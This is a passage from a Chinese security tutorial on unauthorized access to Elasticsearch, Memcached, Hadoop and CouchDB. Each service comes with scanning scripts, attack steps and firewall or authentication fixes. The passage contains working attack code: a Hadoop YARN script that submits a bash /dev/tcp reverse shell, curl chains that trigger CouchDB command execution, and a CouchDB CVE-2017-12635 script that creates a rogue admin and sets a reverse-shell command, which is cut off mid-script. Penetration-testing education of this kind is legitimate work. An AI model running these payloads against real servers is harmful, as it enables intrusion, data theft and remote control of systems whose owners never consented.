+<code>http://localhost:9200/_cat/indices</code> 里面的indices包含了_river一般就是安装了river了。</p>
+
+<p><a href="http://localhost:9200/_plugin/head/">http://localhost:9200/_plugin/head/</a> web管理界面<br />
+<a href="http://localhost:9200/_cat/indices">http://localhost:9200/_cat/indices</a><br />
+<a href="http://localhost:9200/_river/_search">http://localhost:9200/_river/_search</a> 查看数据库敏感信息<br />
+<a href="http://localhost:9200/_nodes">http://localhost:9200/_nodes</a> 查看节点数据</p>
+
+<p><img src="https://img.04z.net/img/evi1ox_2018-05-02_11-12-190.jpg" alt="" /><br />
+<img src="https://img.04z.net/img/evi1ox_2018-05-02_11-14-020.jpg" alt="" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">#! /usr/bin/env python
+# _*_  coding:utf-8 _*_
+
+import requests
+def Elasticsearch_check(ip, port=9200, timeout=5):
+    try:
+    　　url = &#34;http://&#34;+ip+&#34;:&#34;+str(port)+&#34;/_cat&#34;
+    　　response = requests.get(url)
+    except:
+    　　pass
+    if &#34;/_cat/master&#34; in response.content:
+    　　print &#39;[+] Elasticsearch Unauthorized: &#39; +ip+&#39;:&#39;+str(port)
+
+if __name__ == &#39;__main__&#39;:
+    Elasticsearch_check(&#34;127.0.0.1&#34;)</pre></td></tr></table>
+</div>
+</div>
+<p><a href="https://www.secpulse.com/archives/46394.html">https://www.secpulse.com/archives/46394.html</a></p>
+
+<h2 id="3-漏洞修复"><strong>3.漏洞修复</strong></h2>
+
+<p>(1)、默认开启的9200端口和使用的端口不对外公布，或架设内网环境。或者防火墙上设置禁止外网访问9200端口。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">// accept
+# iptables -A INPUT -p tcp -s 127.0.0.1 --dport 9200 -j ACCEPT
+# iptables -A INPUT -p udp -s 127.0.0.1 --dport 9200 -j ACCEPT
+
+// drop
+# iptables -I INPUT -p tcp --dport 9200 -j DROP
+# iptables -I INPUT -p udp --dport 9200 -j DROP
+
+// 保存规则并重启 iptables
+# service iptables save
+# service iptables restart</pre></td></tr></table>
+</div>
+</div>
+<p>(2)、架设nginx反向代理服务器，并设置http basic认证来实现elasticsearch的登录认证。<br />
+<a href="https://www.jianshu.com/p/7ec26c13abbb">https://www.jianshu.com/p/7ec26c13abbb</a><br />
+<a href="https://www.sojson.com/blog/213.html">https://www.sojson.com/blog/213.html</a><br />
+(3)、限制IP访问，绑定固定IP<br />
+(4)、为elasticsearch增加登录验证，可以使用官方推荐的shield插件，该插件为收费插件，可试用30天，免费的可以使用elasticsearch-http-basic，searchguard插件。插件可以通过运行Biplugin install [github-name]/repo-name。同时需要注意增加验证后，请勿使用弱口令。 在config/elasticsearch.yml中为9200端口设置认证：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">http.basic.enabled     true     #开关，开启会接管全部HTTP连接
+http.basic.user     &#34;admin&#34;     #账号
+http.basic.password     &#34;admin_pw&#34;     #密码
+http.basic.ipwhitelist     [&#34;localhost&#34;, &#34;127.0.0.1&#34;]     #白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则
+http.basic.trusted_proxy_chains     []     #信任代理列表
+http.basic.log     false     #把无授权的访问事件添加到ES的日志
+http.basic.xforward     &#34;&#34;     #记载代理路径的header字段名</pre></td></tr></table>
+</div>
+</div>
+<p><a href="https://github.com/elastic/kibana/blob/3.0/sample/nginx.conf">https://github.com/elastic/kibana/blob/3.0/sample/nginx.conf</a><br />
+<a href="https://blog.csdn.net/u011419453/article/details/39395627">https://blog.csdn.net/u011419453/article/details/39395627</a></p>
+
+<h1 id="0x06-memcache未授权访问">0x06 Memcache未授权访问</h1>
+
+<p>memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。</p>
+
+<h2 id="1-扫描探测-4"><strong>1.扫描探测</strong></h2>
+
+<p><img src="https://img.04z.net/img/evi1ox_2018-05-02_13-56-45.jpg" alt="" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#! /usr/bin/env python</span>
+<span class="c1"># _*_  coding:utf-8 _*_</span>
+<span class="k">def</span> <span class="nf">Memcache_check</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">11211</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">socket</span><span class="o">.</span><span class="n">setdefaulttimeout</span><span class="p">(</span><span class="n">timeout</span><span class="p">)</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)))</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;stats</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s2">&#34;STAT version&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s1">&#39;[+] Memcache Unauthorized: &#39;</span> <span class="o">+</span><span class="n">ip</span><span class="o">+</span><span class="s1">&#39;:&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">pass</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">Elasticsearch_check</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="2-攻击利用-1"><strong>2.攻击利用</strong></h2>
+
+<p><strong>2.1 基础部分</strong></p>
+
+<p>通过一个<code>cheat sheet</code>了解一下Memcached的协议。Memcached的语法由如下元素组成</p>
+
+<ul>
+<li>{COMMAND}0x20{ARGUMENT}(LF|CRLF)<br />
+<br /></li>
+</ul>
+
+<p>command字段有如下几条命令</p>
+
+<ul>
+<li>存储操作(set, add, replace, append, prepend, cas)<br /></li>
+<li>检索操作 (get, gets)<br /></li>
+<li>删除操作 (delete)<br /></li>
+<li>增减操作 (incr, decr)<br /></li>
+<li>touch<br /></li>
+<li>slabs reassign<br /></li>
+<li>slabs automove<br /></li>
+<li>lru_crawler<br /></li>
+<li>统计操作(stats items, slabs, cachedump)<br /></li>
+<li>其他操作 (version, flush_all, quit)<br />
+<br /></li>
+</ul>
+
+<hr />
+
+<table>
+<thead>
+<tr>
+<th align="left">Command</th>
+<th align="right">描述</th>
+<th align="center">实例</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td align="left">get</td>
+<td align="right">读某个值</td>
+<td align="center">get mykey</td>
+</tr>
+
+<tr>
+<td align="left">set</td>
+<td align="right">强制设置某个键值</td>
+<td align="center">set mykey 0 60 5</td>
+</tr>
+
+<tr>
+<td align="left">add</td>
+<td align="right">添加新键值对</td>
+<td align="center">add newkey 0 60 5</td>
+</tr>
+
+<tr>
+<td align="left">replace</td>
+<td align="right">覆盖已经存在的key</td>
+<td align="center">replace key 0 60 5</td>
+</tr>
+
+<tr>
+<td align="left">flush_all</td>
+<td align="right">让所有条目失效</td>
+<td align="center">flush_all</td>
+</tr>
+
+<tr>
+<td align="left">stats</td>
+<td align="right">打印当前状态</td>
+<td align="center">stats</td>
+</tr>
+
+<tr>
+<td align="left">stats malloc</td>
+<td align="right">打印内存状态</td>
+<td align="center">stats malloc</td>
+</tr>
+
+<tr>
+<td align="left">version</td>
+<td align="right">打印Memcached版本</td>
+<td align="center">version</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">stats  //查看memcache 服务状态
+stats items  //查看所有items
+stats cachedump 32 0  //获得缓存key
+get :state:264861539228401373:261588   //通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</pre></td></tr></table>
+</div>
+</div>
+<p><strong>2.2 建立连接并获取信息</strong><br />
+<code>telnet &lt;target&gt; 11211</code>，或<code>nc -vv &lt;target&gt; 11211</code>，无需用户名密码，可以直接连接memcache 服务的11211端口。<br />
+<img src="https://img.04z.net/img/evi1ox_2018-05-02_14-05-53.jpg" alt="" /></p>
+
+<p>附赠大佬写的文章 <a href="https://xz.aliyun.com/t/2018">Discuz!因Memcached未授权访问导致的RCE</a></p>
+
+<hr />
+
+<h2 id="3-防范措施-1"><strong>3.防范措施</strong></h2>
+
+<p><em>1.限制访问</em><br />
+如果memcache没有对外访问的必要，可在memcached启动的时候指定绑定的ip地址为 127.0.0.1。其中 -l 参数指定为本机地址。例如：<br />
+<code>memcached -d -m 1024 -u root -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></p>
+
+<p>或者 vim /etc/sysconfig/memcached，修改配置文件<br />
+*<code>OPTIONS=&quot;-l 127.0.0.1&quot;</code>*，只能本机访问，不对公网开放，保存退出 /etc/init.d/memcached reload</p>
+
+<p><em>2.防火墙</em></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">// accept
+# iptables -A INPUT -p tcp -s 127.0.0.1 --dport 11211 -j ACCEPT
+# iptables -A INPUT -p udp -s 127.0.0.1 --dport 11211 -j ACCEPT
+
+// drop
+# iptables -I INPUT -p tcp --dport 11211 -j DROP
+# iptables -I INPUT -p udp --dport 11211 -j DROP
+
+// 保存规则并重启 iptables
+# service iptables save
+# service iptables restart</pre></td></tr></table>
+</div>
+</div>
+<p><em>3.使用最小化权限账号运行Memcached服务</em><br />
+使用普通权限账号运行，指定Memcached用户。<br />
+<code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</code></p>
+
+<p><em>4.启用认证功能</em><br />
+Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。<a href="http://www.postfix.org/SASL_README.html?spm=a2c4g.11186623.2.5.RpKdcX#saslauthd">SASL认证详细配置手册</a></p>
+
+<p><em>5.修改默认端口</em><br />
+修改默认11211监听端口为11222端口。在Linux环境中运行以下命令：<br />
+<code>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid</code></p>
+
+<p><em>6.定期升级</em></p>
+
+<p>参考:<br />
+<a href="http://lzone.de/cheat-sheet/memcached">http://lzone.de/cheat-sheet/memcached</a><br />
+<a href="https://www.secpulse.com/archives/49659.html">https://www.secpulse.com/archives/49659.html</a><br />
+<a href="https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/">https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/</a><br />
+<a href="https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf">https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf</a><br />
+<a href="http://niiconsulting.com/checkmate/2013/05/memcache-exploit/">http://niiconsulting.com/checkmate/2013/05/memcache-exploit/</a><br />
+<a href="https://xz.aliyun.com/t/2018">https://xz.aliyun.com/t/2018</a><br />
+<a href="http://drops.xmd5.com/static/drops/web-8987.html">http://drops.xmd5.com/static/drops/web-8987.html</a><br />
+<a href="https://blog.csdn.net/microzone/article/details/79262549">https://blog.csdn.net/microzone/article/details/79262549</a></p>
+
+<h1 id="0x07-hadoop未授权访问">0x07 Hadoop未授权访问</h1>
+
+<p>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理：</p>
+
+<ul>
+<li>用户创建一个处理键值的map函数<br /></li>
+<li>产生了一套中间键/值<br /></li>
+<li>reduce函数合并中间值并把他们关联到对应的键<br />
+<br /></li>
+</ul>
+
+<h2 id="1-扫描探测-5"><strong>1.扫描探测</strong></h2>
+
+<p><strong>1.1 常见端口</strong><br />
+<img src="https://img.04z.net/img/evi1ox_2018-05-02_15-16-63.png" alt="" /></p>
+
+<p><strong>1.2 敏感端口</strong></p>
+
+<table>
+<thead>
+<tr>
+<th align="left">模块</th>
+<th align="right">节点</th>
+<th align="center">默认端口</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td align="left">HDFS</td>
+<td align="right">NameNode</td>
+<td align="center">50070</td>
+</tr>
+
+<tr>
+<td align="left">HDFS</td>
+<td align="right">SecondNameNode</td>
+<td align="center">50090</td>
+</tr>
+
+<tr>
+<td align="left">HDFS</td>
+<td align="right">DataNode</td>
+<td align="center">50075</td>
+</tr>
+
+<tr>
+<td align="left">HDFS</td>
+<td align="right">Backup/Checkpoint node</td>
+<td align="center">50105</td>
+</tr>
+
+<tr>
+<td align="left">MapReduce</td>
+<td align="right">JobTracker</td>
+<td align="center">50030</td>
+</tr>
+
+<tr>
+<td align="left">MapReduce</td>
+<td align="right">TaskTracker</td>
+<td align="center">50060</td>
+</tr>
+</tbody>
+</table>
+
+<p>通过访问 NameNode WebUI 管理界面的 50070 端口，可以下载任意文件。而且，如果 DataNode 的默认端口 50075 开放，攻击者可以通过 HDSF 提供的 restful API 对 HDFS 存储的数据进行操作。</p>
+
+<p><img src="https://img.04z.net/img/evi1ox_2018-05-02_15-11-43.jpg" alt="" /></p>
+
+<h2 id="2-攻击手法"><strong>2.攻击手法</strong></h2>
+
+<p>利用方法和原理中有一些不同。在没有 hadoop client 的情况下，直接通过 <a href="https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html">REST API</a> 也可以提交任务执行。</p>
+
+<p>利用过程如下：</p>
+
+<ul>
+<li>在本地监听等待反弹 shell 连接<br /></li>
+<li>调用 New Application API 创建 Application<br /></li>
+<li>调用 Submit Application API 提交<br />
+<br /></li>
+</ul>
+
+<p><strong>P牛的攻击脚本</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:8088/&#39;</span>
+<span class="n">lhost</span> <span class="o">=</span> <span class="s1">&#39;192.168.0.1&#39;</span> <span class="c1"># put your local host ip here, and listen at port 9999</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;ws/v1/cluster/apps/new-application&#39;</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="n">app_id</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;application-id&#39;</span><span class="p">]</span>
+<span class="n">url</span> <span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;ws/v1/cluster/apps&#39;</span>
+<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;application-id&#39;</span><span class="p">:</span> <span class="n">app_id</span><span class="p">,</span>
+    <span class="s1">&#39;application-name&#39;</span><span class="p">:</span> <span class="s1">&#39;get-shell&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;am-container-spec&#39;</span><span class="p">:</span> <span class="p">{</span>
+        <span class="s1">&#39;commands&#39;</span><span class="p">:</span> <span class="p">{</span>
+            <span class="s1">&#39;command&#39;</span><span class="p">:</span> <span class="s1">&#39;/bin/bash -i &gt;&amp; /dev/tcp/</span><span class="si">%s</span><span class="s1">/9999 0&gt;&amp;1&#39;</span> <span class="o">%</span> <span class="n">lhost</span><span class="p">,</span>
+        <span class="p">},</span>
+    <span class="p">},</span>
+    <span class="s1">&#39;application-type&#39;</span><span class="p">:</span> <span class="s1">&#39;YARN&#39;</span><span class="p">,</span>
+<span class="p">}</span>
+<span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-05-02_15-14-09.jpg" alt="" /></p>
+
+<h2 id="3-防范措施-2"><strong>3.防范措施</strong></h2>
+
+<p><em>1. 网络访问控制</em><br />
+使用 安全组防火墙 或本地操作系统防火墙对访问源 IP 进行控制。如果您的 Hadoop 环境仅对内网服务器提供服务，建议不要将 Hadoop 服务所有端口发布到互联网。</p>
+
+<p><em>2. 启用认证功能</em><br />
+启用 Kerberos 认证功能。</p>
+
+<p><em>3. 更新补丁</em><br />
+不定期关注 Hadoop 官方发布的最新版本，并及时更新补丁。</p>
+
+<h1 id="0x08-couchdb未授权访问">0x08 CouchDB未授权访问</h1>
+
+<p><strong>介绍</strong></p>
+
+<p>CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。<br />
+CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，query_server在配置文件local.ini中的格式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">[query_servers]
+LANGUAGE = PATH ARGS
+默认情况下，配置文件中已经设置了两个query_servers:
+
+[query_servers]
+javascript = /usr/bin/couchjs /usr/share/couchdb/server/main.js
+coffeescript = /usr/bin/couchjs /usr/share/couchdb/server/main-coffee.js</pre></td></tr></table>
+</div>
+</div>
+<p>可以看到，CouchDB在query_server中引入了外部的二进制程序来执行命令，如果我们可以更改这个配置，那么就可以利用数据库来执行命令了</p>
+
+<p>在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。<br />
+<a href="http://bobao.360.cn/learning/detail/4716.html">http://bobao.360.cn/learning/detail/4716.html</a><br />
+<a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></p>
+
+<p><em><code>影响版本：小于 1.7.0 以及 小于 2.1.1</code></em></p>
+
+<p>该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。</p>
+
+<h2 id="1-扫描探测-6"><strong>1.扫描探测</strong></h2>
+
+<p><code>nmap -p 5984 --script &quot;couchdb-stats.nse&quot; 127.0.0.1</code><br />
+<img src="https://img.04z.net/img/evi1ox_2018-05-02_21-59-58.jpg" alt="" /></p>
+
+<h2 id="2-两个版本的利用方式"><strong>2.两个版本的利用方式</strong></h2>
+
+<p><strong><em>(1) 1.6.0 下的说明</em></strong></p>
+
+<p>依次执行如下请求即可触发任意命令执行,其中,vulhub:vulhub为管理员账号密码。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd&#39; -d &#39;&#34;id &gt;/tmp/success&#34;&#39;
+curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/vultest&#39;
+curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/vultest/vul&#39; -d &#39;{&#34;_id&#34;:&#34;770895a97726d5ca6d70a22173005c7b&#34;}&#39;
+curl -X POST &#39;http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10&#39; -d &#39;{&#34;language&#34;:&#34;cmd&#34;,&#34;map&#34;:&#34;&#34;}&#39; -H &#39;Content-Type:application/json&#39;</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-05-02_15-31-37.jpg" alt="" /><br />
+第一个请求是添加一个名字为cmd的query_servers，其值为<code>id &gt;/tmp/success</code>，这就是我们后面待执行的命令。<br />
+第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。<br />
+第四个请求就是在这个Database里进行查询，因为我将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行。</p>
+
+<hr />
+
+<p><strong><em>(2) 2.1.0 下的说明</em></strong></p>
+
+<p>2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。<br />
+Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问/_membership即可：</p>
+
+<p><code>curl http://vulhub:vulhub@your-ip:5984/_membership</code></p>
+
+<p>可见，我们这里只有一个node，名字是nonode@nohost。</p>
+
+<p>然后，我们修改nonode@nohost的配置：</p>
+
+<p><code>curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '&quot;id &gt;/tmp/success&quot;'</code></p>
+
+<p>然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/vultest&#39;
+curl -X PUT &#39;http://vulhub:vulhub@your-ip:5984/vultest/vul&#39; -d &#39;{&#34;_id&#34;:&#34;770895a97726d5ca6d70a22173005c7b&#34;}&#39;</pre></td></tr></table>
+</div>
+</div>
+<p>Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d &#39;{&#34;_id&#34;:&#34;_design/test&#34;,&#34;views&#34;:{&#34;wooyun&#34;:{&#34;map&#34;:&#34;&#34;} },&#34;language&#34;:&#34;cmd&#34;}&#39; -H &#34;Content-Type: application/json&#34;</pre></td></tr></table>
+</div>
+</div>
+<p>增加_view的同时即触发了query_servers中的命令。</p>
+
+<p><strong>2.1 p牛的python脚本 支持高低版本,需要在version = 定义</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:5984&#39;</span>
+<span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;&#34;bash -i &gt;&amp; /dev/tcp/192.168.2.64/2222 0&gt;&amp;1&#34;&#39;</span>
+<span class="n">version</span> <span class="o">=</span> <span class="mi">2</span>
+
+<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+<span class="n">session</span><span class="o">.</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span>
+<span class="p">}</span>
+<span class="c1"># session.proxies = {</span>
+<span class="c1">#     &#39;http&#39;: &#39;http://127.0.0.1:8085&#39;</span>
+<span class="c1"># }</span>
+<span class="n">session</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">target</span> <span class="o">+</span> <span class="s1">&#39;/_users/org.couchdb.user:wooyun&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;{
+</span><span class="s1">  &#34;type&#34;: &#34;user&#34;,
+</span><span class="s1">  &#34;name&#34;: &#34;wooyun&#34;,
+</span><span class="s1">  &#34;roles&#34;: [&#34;_admin&#34;],
+</span><span class="s1">  &#34;roles&#34;: [],
+</span><span class="s1">  &#34;password&#34;: &#34;wooyun&#34;
+</span><span class="s1">}&#39;&#39;&#39;</span><span class="p">)</span>
+
+<span class="n">session</span><span class="o">.</span><span class="n">auth</span> <span class="o">=</span> <span class="n">HTTPBasicAuth</span><span class="p">(</span><span class="s1">&#39;wooyun&#39;</span><span class="p">,</span> <span class="s1">&#39;wooyun&#39;</span><span class="p">)</span>
+
